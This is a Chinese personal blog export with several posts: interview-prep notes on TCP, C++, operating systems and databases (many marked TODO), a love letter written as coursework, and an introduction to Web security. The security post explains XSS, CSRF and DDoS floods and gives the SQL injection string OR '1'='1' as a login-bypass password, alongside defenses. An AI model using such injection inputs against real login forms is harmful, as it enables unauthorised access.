序列号、确认应答、超时重传在数据包传输的过程中，每个数据包都有一个序列号，当数据到达接收方时，接收方会发出一个确认应答，表示收到该数据包，并会说明下一次需要接收到的数据包序列号(32位确认序列号)。如果发送端在一段时间内(2RTT没有收到确认应答，则说明可能是发送的数据包丢失或者确认应答包丢失，此时发送端会进行数据包重传。 但发送端并不是一定要等到接收到上一个数据包的确认应答再发送下一个数据包，TCP会利用窗口控制来提高传输速度，在一个发送窗口大小内，不用一定要等到应答才能发送下一段数据，发送窗口大小就是无需等待确认而可以继续发送数据的最大值。而发送窗口的大小是由接收端的接受窗口的剩余大小和拥塞窗口来决定的。(TCP会话的双方都各自维护一个发送窗口和一个接收窗口) 拥塞控制发送端维持一个叫做拥塞窗口cwnd（congestion window）的状态变量。拥塞窗口的大小取决于网络的拥塞程度，并且动态地在变化。发送端让自己的发送窗口等于拥塞窗口，另外考虑到接受方的接收能力，发送窗口可能小于拥塞窗口。 TCP的拥塞控制主要是采用慢启动以及增性加，乘性减的机制，TCP一开始将拥塞窗口设置的很小，在逐渐经过一段时间的指数增长后超过门限，进入增性加阶段，此时窗口大小的增长是线性的，比之前的指数增长要慢很多，而当发生网络拥塞时，拥塞窗口大小直接减半（乘性减）。 TCP长连接和短连接有什么区别？TCP短连接是指客户端与服务端连接后只进行一次读写就关闭连接，一般是客户端关闭。而长连接则是指在进行完一次读写后不关闭连接，直到服务端压力过大则选择关闭一些长时间为进行读写的连接。 TCP短连接的优点在于管理简单，而且不会对服务端造成太大的压力，而缺点是每次读写都需要连接耗时较长。 TCP长连接的优点是可以迅速进行多次读写，缺点是对服务端压力大，且容易被恶意连接影响服务。 长短连接的区别就在于客户端和服务端选择的关闭策略不同，具体需要根据应用场景来选择合适的策略。 TCP粘包、拆包及解决方法？TCP之所以会产生粘包和拆包拆包问题，是因为他本身就是一种字节流协议，TCP本身就没有数据包的概念，需要发送和接受的数据是没有格式的，以字节流的形式传输，而在传输过程中会被分割为一段段数据块，也就是报文。TCP要发送的数据会被先放置在数据缓冲区，接收数据也是从缓冲区获取，而缓冲区的大小即为最大报文长度，如果需要发送的数据长度大于缓冲区剩余的大小或者大于最大报文长度，则会出现拆包，如果是需要发送的数据很少，而短时间内又有其他数据包需要发送，就会出现粘包的现象。 解决方案有很多种，可以在数据包头加上数据包长度，或者把每个数据包封装为固定长度，不够则补0，以及可以使用特定分割符号等等 我们在项目中也遇到过这种问题，因为我们在做流量检测的时候，有时候难以找到恶意软件的流量特征，会把数据包长度当做特征来使用，有些恶意软件内部无论会把这些数据包长度写死，这样恶意软件本身就不存在有无法解析粘包和拆包的情况，但对于我们来说，检测就会遇到障碍，尤其是攻击者可以设置MSS来使得数据包长度改变，对于这种攻击我们目前也没有很好的方案来解决。 TCP进阶问题不会吧不会吧，真的有人会问的这么难嘛 参考TCP细节知识 参考链接 一文详解TCP C++工程师面试宝典之计算机网络 网络基础：TCP协议-如何保证传输可靠性 解析TCP之滑动窗口 TCP握手中的半连接队列和全连接队列 TCP长连接与短连接的区别 TCP粘包，拆包及解决方法","categories":[{"name":"计网","slug":"计网","permalink":"https://liuyi12138.github.io/categories/计网/"}],"tags":[{"name":"计网","slug":"计网","permalink":"https://liuyi12138.github.io/tags/计网/"},{"name":"面经","slug":"面经","permalink":"https://liuyi12138.github.io/tags/面经/"}]},{"title":"Web安全简介","slug":"Web安全简介","date":"2020-05-23T08:39:36.000Z","updated":"2021-02-23T06:34:31.910Z","comments":true,"path":"2020/05/23/Web安全简介/","link":"","permalink":"https://liuyi12138.github.io/2020/05/23/Web安全简介/","excerpt":"在腾讯实习生面试的时候被问到Web安全，发现自己不是很了解，在此简单记录一下常见的一些Web安全知识。","text":"在腾讯实习生面试的时候被问到Web安全，发现自己不是很了解，在此简单记录一下常见的一些Web安全知识。 Web从业者和网安从业者都需要对Web安全有一定了解，常见的Web攻击方式有XSS、SQL注入、DDOS、CSRF等，其中有一部分在ctf比赛中也会有所接触。 OWASP TOP10OWASP TOP10这个榜单的描述感觉挺抽象的，2017版如下，但在面试的时候最好不要全盘托出12345678910A1 注入 InjectionA2 失效的身份认证A3 敏感信息泄露A4 XML外部实体（XXE）A5 失效的访问控制A6 安全配置错误A7 跨站脚本（XSS）A8 不安全的反序列化A9 使用含有已知漏洞的组件A10 不足的日志记录和监控 我的面试回答： 这个榜单我记不大全了，但我可以按照我的理解大概梳理一下常见的WEB安全问题，大概有注入（包括SQL注入、OS注入等）、身份信息验证（比如中间人攻击这种对握手阶段的攻击）、XSS攻击、CSRF攻击、以及一些安全配置问题，比如使用含有漏洞的框架等等。 XSSXSS简介XSS攻击：跨站脚本攻击(Cross-Site Scripting)是指攻击者往Web页面中插入恶意的Script代码，当其他用户浏览该页面是，恶意代码就会执行，从而达到攻击用户的目的。 一般xss漏洞是通过php的输出函数将js代码输出到html页面，通过用户本地浏览器进行执行。 XSS漏洞分类XSS漏洞一般分为两类： 存储型XSS(持久化)：主要出现在让用户输入数据，供其他浏览此页的用户进行查看的地方，包括留言、评论、博客日志和各类表单等，攻击者在相关页面输入脚本代码，当其他用户访问时，服务器会从数据库中查询到该代码并发送给其他用户的浏览器。 反射型XSS(非持久化)：将脚本代码加入URL中，需要欺骗用户去点击链接才会触发脚本。 XSS实战 防御方法 过滤特殊字符：对用户输入的内容中的敏感字段进行过滤，比如&lt;script&gt;标签等 使用HTTP头指定数据类型，比如指定为&quot;text/javascript&quot;,就可以让浏览器来解析js代码 SQL注入SQL注入简介攻击者向服务器提交恶意的SQL查询代码，程序在接收到后错误地将输入当做查询语句的一部分进行执行，导致原始的查询逻辑被改变。 举例：OR &#39;1&#39;=&#39;1&#39;，当我们进行登录的时候把这段字符串作为password，就可能直接绕过SQL查询时对password的校验。 防御方法 对sql语句进行预编译，这样的话即使攻击者伪造了参数，到服务端时这些参数都会被当做字符处理 对输入的特殊字符进行正则匹配等过滤方法 在后端进行转义或者编码转换 DDOSDDOS简介DDOS全称 Distributed Denial of Service，中文意思为 “分布式拒绝服务”，就是利用大量合法的分布式服务器对目标发送请求，从而导致正常合法用户无法获得服务。 DDOS分类资源消耗类攻击资源消耗类DDOS是比较典型的DDOS攻击，通过大量请求消耗正常的带宽和协议栈处理资源的能力，从而达到服务端无法正常工作的目的。最具代表性的有Syn Flood、Ack Flood、UDP Flood Syn FloodSyn Flood 是当前网络上常见的 DDoS 攻击，攻击者会向网络服务所在的端口发送大量伪造的大量的 SYN 包，并且缺少三次握手的最后一步握手 ACK 回复，造成目标服务器中的半连接队列被占满，从而阻止其他合法用户进行访问。 Ack Flood在TCP连接建立后，所有的TCP报文都带有ACK标志位，服务器收到带有ACK标志位的数据包后悔进行查表检查该数据包所表示的连接四元组是否存在，来判断该数据包是否合法，如果不合法则需要回应RST包。攻击者在进行Ack Flood攻击时会发送大量非法的带有ACK标志位的数据包，而服务器需要进行查表和回应RST包，这就造成了服务器资源被占用，Ack Flood危害一般小于Syn Flood。 服务消耗性攻击服务消耗性攻击主要是针对服务的特点进行精确定点打击，比如文件下载，数据检索等接口 Web的CC攻击CC(Challenge Collapsar)就是模拟多个用户，多少线程就是多少用户，不停地进行访问那些需要大量数据操作，就是需要大量CPU时间的页面，造成服务器资源的浪费，CPU长时间处于100%，永远都有处理不完的连接直至就网络拥塞，正常的访问被中止。 反射类攻击反射攻击也叫放大攻击，该类攻击以UDP协议为主，一般请求回应的流量远远大于请求本身流量的大小。攻击者通过流量被放大的特点以较小的流量带宽就可以制造出大规模的流量源，从而对目标发起攻击。 防御方法 对流量进行检测与拦截 可以引申出nmap Nmapnmap是一个网络连接端扫描软件，用来扫描网上电脑开放的网络连接端。确定哪些服务运行在哪些连接端，并且推断计算机运行哪个操作系统（通过指纹判断）。 nmap扫描使用的数据包都是自行构建的，在流量层面有一定的特征，可以根据这些特征检测出是否有主机被nmap进行扫描，并及时阻断。 CSRFCSRF简介CSRF（Cross-site request forgery），中文名称：跨站请求伪造，也被称为：one click attack/session riding，缩写为：CSRF/XSRF。 用大白话解释解释就是在你访问恶意站点A的时候，A让你去访问一次网站B，你在访问B的时候浏览器会自动带上你之前访问A所留下的cookie，这样恶意网站A就可以模拟用户的操作了。 防御方法同源策略同源策略是保障浏览器安全的一种重要的安全策略，他要求不同源的客户端脚本在没有明确授权的情况下，不能读写对方资源。而同源策略在我们进行Web开发时会导致跨域问题。 Hash验证在表单中增加对Cookie的Hash，来保证请求是由客户端发送的。但由于用户的Cookie可能被XSS攻击等方式获取到，所以这种方法无法完全保证安全。 验证码用户登录需要填写验证码，这个方案很不方便 参考资料 常见web攻击总结 DDoS 攻击详解1 DDoS 攻击详解2 同源策略和跨域解决方案 CSRF攻击原理以及防御","categories":[{"name":"网络安全","slug":"网络安全","permalink":"https://liuyi12138.github.io/categories/网络安全/"}],"tags":[{"name":"面经","slug":"面经","permalink":"https://liuyi12138.github.io/tags/面经/"},{"name":"网络安全","slug":"网络安全","permalink":"https://liuyi12138.github.io/tags/网络安全/"}]},{"title":"遥寄远方的碎碎念","slug":"遥寄远方的碎碎念","date":"2020-05-03T08:22:44.000Z","updated":"2021-02-23T06:34:31.941Z","comments":true,"path":"2020/05/03/遥寄远方的碎碎念/","link":"","permalink":"https://liuyi12138.github.io/2020/05/03/遥寄远方的碎碎念/","excerpt":"爱情心理学课程作业——写给xx的一封情书！","text":"爱情心理学课程作业——写给xx的一封情书！ 前言花了大半天的时间去回忆与搜寻了咱俩自第一次见面起的点点滴滴，感觉心里有万千话语涌起，等到下笔时，却又不知道从何讲起了。我不是很喜欢情书这种形式，因为太多情话在两个人耳鬓厮磨时已经说尽了，无非就是我爱你，永远爱你，一辈子都爱你。但等到夜深人静时，再去仔细品味两个人之间的点点滴滴，又别是一番风味。于是乎，就有了这篇碎碎念，别嫌我啰嗦，我只是想把我记忆中的每一次的心动与每一抹温柔都说给你听。 初闻人们常说第一映像就决定了未来两个人会不会在一起，每当我回想起对你的第一映像，都会觉得十分魔幻，因为第一次知道有你这个人是在18级的新生群，我是学长，你是学妹。乍一听又是学长追到学妹的烂俗戏码，但实则我第一次见到你的照片的感触就是“嗷，这个学妹好漂亮，完全是我的菜，但我不敢去追。”，换成后来百日纪念时我记下的话语则是”世上有如此佳人，只怨年少读书甚少，做不得锦衣才子。”，至于为什么说魔幻，是因为当时我发誓不找学妹做女朋友的，毕竟我不想找一个没有恋爱经历的女孩子作为女朋友，我觉得恋爱中但凡有一个人不善于经营感情，往往这段恋情都不会太长久，并且从热恋褪去到分手的这段过程是极度曲折而痛苦的，就像我和我的前女友一样。但最终我对你的态度从不想相识，到认识就好，再到想做你的男朋友，这其中的转变真的曲折而奇妙，那种感觉能让我自己回味很久。 回到正题，当时一眼见你，就戳到了我心里，一下子在我心里勾勒出了一个邻家小妹的形象。仿佛就是我在旧文说道的那个水样的姑娘。于是，我开始想认识你，就只是认识认识，远远观望就行。 xx与她的录取通知书 那时我还加了你们班群，在暑假里与你们班的小伙伴们打成一片，每天白天在实验室辛苦工作，晚上回到寝室就与你们视频或连麦，也就是那时，知道了你有男朋友诶，后来临近开学又知道你分手了，当然这对于当时的我来说也并不是多大的一个消息，因为当时觉得有个漂亮学妹做朋友就已经很不错了。日子就这么一天天过着，转眼间就到了咱俩初见的那一天了。 初见初见的那天是18年九月初，是你们入学的日子，当时我是电信学院科协副主席，所以参与了迎新工作。我还记得是下午三四点的样子，天气很热，我在寝室楼下的迎新帐篷里写代码，修理着学生会的招新网站。那时你和你们班的另一位女生踏着小碎步跑过来，给了我一袋零食，我愣了一愣，一句谢谢刚说出口，你们就一路小跑溜掉了。第一次相见话都没说上，还没仔细看看你，就记得你蹦蹦跳跳的背影，很是可爱呢。 第一次说上话是赠书与你。当时你们要购置大一的课本，我就说把我的课本送给你吧，你也是相当不客气地就同意了。那天下着小雨，你来到我们寝室，小心翼翼地敲门，歪着脑袋只从门框里露出一个头，微微一笑，嘴角的小虎牙就跑出来了。我赶忙把一摞资料书帮你搬到楼下，下楼的过程中我们有说有笑，很是开心，即使那一天你和照片上长得不大一样。在楼下我提出帮你把书搬到你们寝室，被你拒绝了，你叫来了你的一个同学帮你搬书，你帮他打伞，两个人一起走回寝室。我独自一人上楼，突然感觉有些落寞，我就在想，是不是有点喜欢你了呢。 再到下一次见面是科协赛事部的面试，我好说歹说把你忽悠着报名了赛事部，并且安排着由我来面试你。面试的时候两个人都很紧张，我在装模作样问了你几个问题后就开始跟你拉家常，这时候才对你的性格与想法有了一个大致的了解。后来啊，学长和学妹的故事，同时又变成了部长和部员的故事。在咱俩在一起挺久之后，一次科创改革中，我们打算砍掉赛事部这个部门了，你知道后还难过了好久，我问你为什么难过，你委屈巴巴地说“你想啊，要是咱俩以后有了孩子，他问我们是怎么认识的，我可以告诉他，我和爸爸是在学生会的科协赛事部认识的。但你们却要把它砍掉，感觉自己的回忆就会消失了。”我一下子哑然，虽然赛事部最终还是没有了，但我开始知道原来xx这么在意回忆啊，后续有关回忆还有种种，我们慢慢说道。 第一次一起自习 相知与相恋此刻回想起第一次心动，大概是第一次约你出来喝奶茶讲故事。那时我正好从实验室回来，月色正美，就发消息约你出来喝奶茶，你也欣然接受了。两个人拎着奶茶在启明路上有一搭没一搭地聊着，聊得多的是你高中时的一些经历，渐渐地两个人聊到了感情。你给我讲了你和你的前男友，讲到你担心他太累，觉得这段感情肯定没结果所以选择了分手，我当时心里就暗暗在想，这个女孩子真的好潇洒，在感情中拿得起放得下。也正是这是，爱情的种子开始在我心里生根发芽。 两个人正式相恋是在国庆节，你回到家中，而我当时压力里很大，选择了一个人出游郑州，在郑州的几天里我卸载了QQ，放下了很多事情，专心放松身心，后来渐渐地也不知道为什么，开始每天和你打电话，这是我第一次知道原来两个人打电话能打四五个小时之久。10月7日回到学校后，我俩去看了电影，很自然而然地，两个人就走到了一起。 Ly&Xx 浪漫与温柔xx你总是很懊恼，懊恼当时我俩没在一起的时候没多吊我一段时间，导致我没有怎么追你就得手了；同时你又总是很埋怨，埋怨我没有一个正式的表白，感觉恋爱少了这两个阶段就不够完整。我也常常笑道，不如你就甩了我，我再追你一次呗。其实两个人在一起的时间里，有着太多浪漫与温柔，如果担心以后会忘记，不妨把它记录下来，若是你不愿意去做记录，那就我来吧。 2019年2月14日，咱俩在一起的第一个情人节，我记得那是大年初十，我初七回到学校，收拾好东西后就萌生念头想去找你，于是我买了第二天晚上的火车票，因为没钱所以买的都是坐票，在辗转了五个多小时之后终于在深夜到达了你所在的城市，同样是因为没钱，住了一个很破的宾馆，并且订了第二天晚上11点的火车回武汉，因为可以少住一晚上宾馆。我至今还记得那天晚上看你酸了别人好久之后，漫不经心地告诉你我到你家了，你当时整个人都炸了，激动与兴奋从电话里溢了出来，我当时就感觉十分满足，感觉一切努力都是值得的。 2019年2月17日，你回到武汉，而我经过了16日一整天的休息之后正好可以去接你。这次我带上了为你准备了三个月的生日礼物，你是早上7点到武汉的火车，所以我5点就早早起床了，骑上了租八戒去往光谷赶早班地铁，最终到达火车站与你汇合。时隔两天你又一次高兴地叫出了声，因为我给你织了一条围巾。从上一年的期末考试周开始，每天晚上回到寝室都一心一意地织半小时围巾，虽然很辛苦，但是心里是暖的。当天晚上给你准备了一个小蛋糕、一只香薰蜡烛、一瓶红酒，我单膝跪地拿出了施华洛世奇的项链，给你补上了你期待已久的表白：zxx，做我女朋友好吗？ 2019年10月7日，我们的一周年纪恋日，收到了xx送的一套衣服，送给xx了我们的周年纪念册，是以照片的形式记录了我们一年以来的点点滴滴。在纪念册的最后一页，是一个进度条，1/80。和xx约定好了，以后每年我们都轮番做纪念册，每年一本，直到老去，想想都觉得浪漫呢。 除此之外还有太多太多美妙的回忆，我记得在武汉动物园那个活泼俏皮的你；我记得在东湖樱园那个激动兴奋的你；我记得在江汉路那个性感撩人的你；我记得江滩边上那个温婉可人的你。我记得太多太多两个人在一起的美好瞬间，从邂逅到相爱，从现在到永远。 当然，我也常常忘记一些重要的事情，有时也会伤到xx的心，但我希望xx知道，虽然我不善言辞不太会哄人，虽然我时常没法看透xx的想法，虽然有时我会很固执不听劝阻，也许作为一个男朋友我可能表现得并不如人意，但我一直在努力，努力着让自己变得更好，努力着为xx做更多，努力着让咱俩一直走下去。 后记这篇碎碎念前前后后花了近乎一天的时间来完成(算上我打游戏摸鱼的时间)，写得很啰嗦，更多的是在写自己一直以来想要记录的点点滴滴，顺便完成了“爱情心理学”课程的作业，当然最终这份作业也会公开发布在我的博客上，最希望的还是xx能看到，我后续也会一直记录自己与xx的感情故事，如果不嫌弃，也希望有人能一直关注，毕竟甜甜的恋爱谁会不喜欢呢~ 在本文中我也提到了一些自己以前写的小段文字，大家可以如果喜欢也可以看看： 高中旧文：念一个云白花清的人 百日纪念：春天的十八个瞬间 国庆出游：郑州——三日谈","categories":[{"name":"文学","slug":"文学","permalink":"https://liuyi12138.github.io/categories/文学/"}],"tags":[{"name":"心声","slug":"心声","permalink":"https://liuyi12138.github.io/tags/心声/"}]},{"title":"面试问题整理——编程语言(主C++)","slug":"面试问题整理——编程语言(主C++)","date":"2020-04-02T15:11:16.000Z","updated":"2021-02-23T06:34:31.941Z","comments":true,"path":"2020/04/02/面试问题整理——编程语言(主C++)/","link":"","permalink":"https://liuyi12138.github.io/2020/04/02/面试问题整理——编程语言(主C++)/","excerpt":"记录一下面试以来遇到的编程语言相关问题及解答","text":"记录一下面试以来遇到的编程语言相关问题及解答 C++相关问题及解答简述智能指针及其实现原理涉及公司：阿里云实习生 由于 C++ 语言没有自动内存回收机制，程序员每次 new 出来的内存都要手动 delete，有时候没有delete就可能会造成内存泄露的情况，此C++ 引用了智能指针。 智能指针是一个类，这个类的构造函数中传入一个普通指针，析构函数中释放传入的指针。智能指针的类都是栈上的对象，所以当函数（或程序）结束时会自动被释放。 一般实现智能指针可以采用辅助类的方式，需要实现构造，析构，拷贝构造，以及对一些解引用运算符。 简述C++多态及其实现原理涉及公司：阿里云实习生、腾讯实习生 多态及其实现条件c++中的多态就是在父类的函数前加上virtual关键字，在子类中重写该函数，运行时将会根据对象的实际类型来调用相应的函数，如果对象类型是子类，就调用子类的函数，如果对象类型是父类，就调用父类的函数。 多态的实现需要两个条件： 虚函数重写，设置不同的状态 对象调用虚函数时必须是指针或者引用 虚函数与重写 虚函数是带有virtual关键字的成员函数 子类有个和父类完全相同(函数名,形参,返回值都相同,协变和析构函数除外)的虚函数,就称子类虚函数重写父类虚函数 多态的原理 多态是用虚函数表来实现的 有虚函数的类都会生成一个虚函数表，在编译的时候使用 虚函数表是一个存储虚函数地址的数组 生成子类的虚函数表需要经过一下步骤 将父类的虚函数表拷贝 将子类中重写的虚函数覆盖掉父类中的虚函数 如果有新增加的虚函数则放到表的最后 在调用时会根据对象中的虚表指针来找实际应该调用的函数 其他问题 虚函数和普通函数一样在代码段,虚表在只读常量区 inline函数(内联函数)没有地址,无法放到虚函数表中 静态成员不能是虚函数，因为静态成员函数没有this指针,因为有this指针才能访问到虚表指针,有虚表指针才能找到虚表从而调用实际应该调用的函数 构造函数不能是虚函数，因为对象中的虚函数表指针是在构造函数初始化列表阶段才初始化的 析构函数可以是虚函数，并且最好把基类的析构函数定义成虚函数，当父类指针指向子类对象时,如果析构函数不是虚函数,析构就只会释放父类对象,造成内存泄漏 普通对象访问普通函数和访问虚函数是一样快的(不会触发多态);指针对象或者是引用对象，调用普通函数更快一些，因为构成了多态，运行时调用虚函数要先到虚函数表中去查找。这样然后才拿到韩式的地址，这样就不如直接可以拿到函数地址的普通函数快。 C++中的extern C涉及公司：腾讯实习生 extern是C/C++语言中表明函数和全局变量作用范围（可见性）的关键字，该关键字告诉编译器，其声明的函数和变量可以在本模块或其它模块中使用(只是声明，不分配内存) 与extern对应的关键字是static，被它修饰的全局变量和函数只能在本模块中使用。因此，一个函数或变量只可能被本模块使用时，其不可能被extern “C”修饰。 被extern “C”修饰的变量和函数是按照C语言方式编译和链接的 之所以要如此是因为编译器在将C++ 源代码编译成目标文件时，会将函数和变量的名称进行修饰，形成符号名，目标文件中所使用的符号名就是修饰后名称，所以对于不同函数签名的函数，即使函数名相同，编译器和链接器都认为它们是不同的函数。因此有时候在调用一些库函数的时候，会出现无法链接的情况(因为函数签名不同)所以对于C++ 来说，必须使用extern “C”来声明这些函数。 为什么会有内存泄漏，怎么检测，怎么避免涉及公司：拼多多实习生 TODO C++11有哪些新特性涉及公司：腾讯实习生 TODO 右值引用解决了什么问题涉及公司：腾讯实习生 TODO Java相关问题及解答简述JAVA的GC机制涉及公司：阿里云实习生 TODO","categories":[{"name":"面经","slug":"面经","permalink":"https://liuyi12138.github.io/categories/面经/"}],"tags":[{"name":"面经","slug":"面经","permalink":"https://liuyi12138.github.io/tags/面经/"}]},{"title":"面试问题整理——Linux&编译原理","slug":"面试问题整理——Linux&编译原理","date":"2020-04-02T15:11:16.000Z","updated":"2021-02-23T06:34:31.941Z","comments":true,"path":"2020/04/02/面试问题整理——Linux&编译原理/","link":"","permalink":"https://liuyi12138.github.io/2020/04/02/面试问题整理——Linux&编译原理/","excerpt":"记录一下面试以来遇到的Linux&amp;编译原理相关问题及解答","text":"记录一下面试以来遇到的Linux&amp;编译原理相关问题及解答 Linux相关问题及解答简述fork创建新进程的机制涉及公司：阿里云实习生 TODO 简述select和epoll的区别涉及公司：腾讯实习生 TODO 编译原理相关问题及解答静态链接和动态链接的区别涉及公司：阿里云实习生 TODO 一个C语言程序编译生成机器码的过程涉及公司：阿里云实习生 这个过程主要分为编译、链接、装载三个步骤，在编译过程中，C语言程序会被编译为汇编代码，再进一步被转换为机器码；在链接过程中，会将该程序调用的各种库与程序链接起来生成一个可执行文件，在装载过程中会去替换机器码中的一些相对地址吗，把它们替换为链接库的绝对地址，最后这个程序就可以运行了。 编译整个过程有哪些具体的阶段涉及公司：阿里云实习生 TODO 词法分析语法分析涉及公司：阿里云实习生 TODO","categories":[{"name":"面经","slug":"面经","permalink":"https://liuyi12138.github.io/categories/面经/"}],"tags":[{"name":"面经","slug":"面经","permalink":"https://liuyi12138.github.io/tags/面经/"}]},{"title":"面试问题整理——数据库","slug":"面试问题整理——数据库","date":"2020-04-02T15:11:16.000Z","updated":"2021-02-23T06:34:31.941Z","comments":true,"path":"2020/04/02/面试问题整理——数据库/","link":"","permalink":"https://liuyi12138.github.io/2020/04/02/面试问题整理——数据库/","excerpt":"记录一下面试以来遇到的数据库相关问题及解答","text":"记录一下面试以来遇到的数据库相关问题及解答 简述关系型数据库与菲关系形数据库的区别与联系涉及公司：阿里云实习生 TODO 简述数据库的事务涉及公司：阿里云实习生 TODO","categories":[{"name":"面经","slug":"面经","permalink":"https://liuyi12138.github.io/categories/面经/"}],"tags":[{"name":"面经","slug":"面经","permalink":"https://liuyi12138.github.io/tags/面经/"},{"name":"数据库","slug":"数据库","permalink":"https://liuyi12138.github.io/tags/数据库/"}]},{"title":"面试问题整理——计算机网络","slug":"面试问题整理——计算机网络","date":"2020-04-02T15:11:16.000Z","updated":"2021-02-23T06:34:31.941Z","comments":true,"path":"2020/04/02/面试问题整理——计算机网络/","link":"","permalink":"https://liuyi12138.github.io/2020/04/02/面试问题整理——计算机网络/","excerpt":"记录一下面试以来遇到的计算机网络相关问题及解答","text":"记录一下面试以来遇到的计算机网络相关问题及解答 简述从输入网址到浏览器显示的过程涉及公司：阿里云实习生 TODO 简述HTTPS的建立过程涉及公司：阿里云实习生、腾讯实习生 TODO 简述对Cookie的理解涉及公司：阿里云实习生 TODO 简述DNS协议的请求过程涉及公司：阿里云实习生 TODO tcp包里的校验和有什么用？是怎么实现的？涉及公司：腾讯实习生 TODO 为什么tcp是三次握手，而不是两次？涉及公司：腾讯实习生 TODO tcp过程中有哪保障数据包数据有效的操作涉及公司：腾讯实习生 TODO","categories":[{"name":"面经","slug":"面经","permalink":"https://liuyi12138.github.io/categories/面经/"}],"tags":[{"name":"面经","slug":"面经","permalink":"https://liuyi12138.github.io/tags/面经/"},{"name":"计算机网络","slug":"计算机网络","permalink":"https://liuyi12138.github.io/tags/计算机网络/"}]},{"title":"面试问题整理——操作系统","slug":"面试问题整理——操作系统","date":"2020-04-02T15:11:16.000Z","updated":"2021-02-23T06:34:31.941Z","comments":true,"path":"2020/04/02/面试问题整理——操作系统/","link":"","permalink":"https://liuyi12138.github.io/2020/04/02/面试问题整理——操作系统/","excerpt":"记录一下面试以来遇到的操作系统相关问题及解答","text":"记录一下面试以来遇到的操作系统相关问题及解答 内存管理简述进程切换的流程涉及公司：阿里云实习生 如果想要从A进程切换到B进程，必定要先从用户态切换到内核态，因为这个切换的工作你不能让用户进程去实现，不然当CPU在用户进程手上的时候，他可以选择一直执行，不让出CPU，这肯定是不允许的。所以操作系统需要先挂起正在占用CPU的A进程，才能切换到B进程。 由于从用户态切换到内核态的时候，CPU是在用户进程手中，所以这个是通过硬中断来实现的。在从用户态切换到内核态之前需要保存用户进程的上下文，以便下一次执行时可以继续之前的工作。 这个上下文就是进程执行的环境，包括所有的寄存器变量，进程打开的文件、内存信息等。一个进程的上下文可以分为用户级上下文，寄存器上下文，系统级上下文。用户级上下文存储的是用户进程的内存数据以及堆栈数据等；寄存器上下文是一些通用寄存器；系统级上下文是内核栈、PCB(进程控制块)等。 进程在地址空间中会划分为哪些区域涉及公司：阿里云实习生 这个问题在我之前的工作中其实还是有所涉及的，我来简单讲一下把文件加载到内存中的一个过程，以Window平台为例吧，PE文件我比较熟，在PE文件中，有一个叫节的概念，节是PE文件中存放代码和数据的基本单元，用以存储不同类型的数据，比如data节、code节等，一个节的所有原始数据必须加载到连续的内存空间里，这也就造成了在虚拟地址空间中的区块划分。 在虚拟地址空间中会按照节划分为代码段、数据段、未初始化的数据段以及堆栈这些区块。 栈与堆有什么区别涉及公司：阿里云实习生、拼多多实习生 我们常说堆栈堆栈，其实堆栈是两个不同的概念，最直观的理解，堆是由用户来控制的，我们可以使用malloc这种命令来在堆中申请内存，而栈是由操作系统控制的，在栈中存储的是这个进程的局部变量等，比如我们用malloc来申请一块内存，内存本身是在堆中开辟的，而指向这块内存的指针存储在栈中。 操作系统为什么分内核态和用户态，这两者之间如何切换涉及公司：拼多多实习生 因为在CPU的指令中，有一些是非常危险的，比如清理内存、设置时钟等，如果所有的程序都能使用，就可能造成系统的崩溃，所以，CPU将指令分为特权指令和非特权指令，对于那些危险的指令，只允许操作系统使用。CPU的特权级别有四级，从Ring0到Ring3，正常使用时一般只有两级，即用户态的Ring3和内核态的Ring0。Ring3状态不能访问Ring0的地址空间，包括代码和数据。 用户态切换到内核态的三种方式 系统调用（系统调用是通过软中断实现的） 中断（硬） 异常 malloc的实现机制涉及公司：阿里云实习生 malloc本质上是维护了一个内存空闲链表，每次我们调用malloc申请空间的时候，链表就会从头开始遍历，来寻找一个合适的空闲内存空间，然后把这个空间给分割开，一部分分配给用户，另一部分继续标注为空闲，而当没有足够大的空闲块时，malloc就会通过系统调用来申请更多的内存块。而我们调用free来释放内存块的时候，该内存块就会回到链表中，并且相邻的内存块会被合并。 搜索空闲块的算法主要有首次适配、下一次适配、最佳适配，首次适配即第一次找到足够大的内存块就分配，但这样会产生很多的内存碎片，也因此第二次适配被提出来缓解这个问题。另一个极端则是最佳适配，即找到一块刚好大于我们所需内存大小的内存块，这种做法一方面耗时长，另一方面也会产生一些极小的内存碎片。这两种思路可以看出是在性能和空间利用率上寻找一个平衡点，在工程中实际上有很多这种没有完美解决方案，只能寻找平衡的问题。 虚拟地址怎么映射到物理地址涉及公司：阿里云实习生、腾讯实习生 虚拟地址的构成为页目录索引(10位)+页表索引(10位)+表内偏移(12位) 以win32系统为例，页目录和页表都为1024个，页表大小为4KB，一共是4G的虚拟内存空间 而从虚拟地址映射到物理地址实际上就是通过页目录和页表的索引找到内存页。 在页表项中有一位标志位，用来标识包含此数据的页是否在物理内存中，如果在的话，就直接做地址映射，否则，抛出缺页中断，操作系统会把次数据页调入内存。 socket编程中怎么处理并发请求涉及公司：阿里云实习生、腾讯实习生 对多线程的处理与单线程不同的位置在于各个不同的进程可能会访问相同的资源，如果是对资源进行修改的话，就需要用到锁 简述IO多路复用涉及公司：阿里云实习生、腾讯实习生 Linux的IO访问通常是先将数据拷贝到操作系统的内核缓冲区，然后再从内核缓冲区拷贝到应用程序的地址空间。在这两个阶段中，有不同的IO方式，主要分为阻塞IO、非阻塞IO、异步IO以及IO多路复用。 阻塞IO即当数据还未准备好，也就是数据还在操作系统的内核缓存区时，用户进程就会一直阻塞，等待数据从操作系统内核缓冲区拷贝到应用程序的地址空间。阻塞IO在这两个阶段都是阻塞的。 非阻塞IO则是如果数据还没准备好，操作系统会给应用程序返回一个error，并不阻塞应用程序，而一般应用程序会持续询问内核数据是否准备好，所以从另一个角度来说也是阻塞的。 而异步IO才是真正的不阻塞，当用户程序发起read后，操作系统会立即进行回复，这样用户程序就可以去做其他事情，当数据被拷贝到用户程序的地中空间后，操作系统会给用户程序发一个信号，而用户程序可以采用回调函数的方式对这个信号进行响应。 IO多路复用则是允许一个程序同时等待多个文件描述符，当任意一个文件描述符就绪，select函数就会返回，当然IO多路复用在本质上还术语阻塞IO，只不过可以同时进行多个IO操作。 Linux的IO多路复用机制中有select、poll、epoll三种，select和poll的时间复杂度都是O(n),因为他们都是在对IO列表进行轮询，不同点在于select能监视的文件描述符有上限，一般为1024，当然这个是在Linux内核中进行的宏定义，是可以修改的，而poll是基于链表来存储的，所以没有这个上限。而epoll是基于事件驱动的，所以不需要轮询，epoll会把事件和每一个IO流对应起来。并且epoll是通过一块共享内存来实现内核空间和用户空间的通信的，比起select和poll的大量数据拷贝效率更高。不过select的优点在于兼容不同的操作系统，而poll和epoll都只能在linux上使用。 简述进程通信的各种方法涉及公司：腾讯实习生 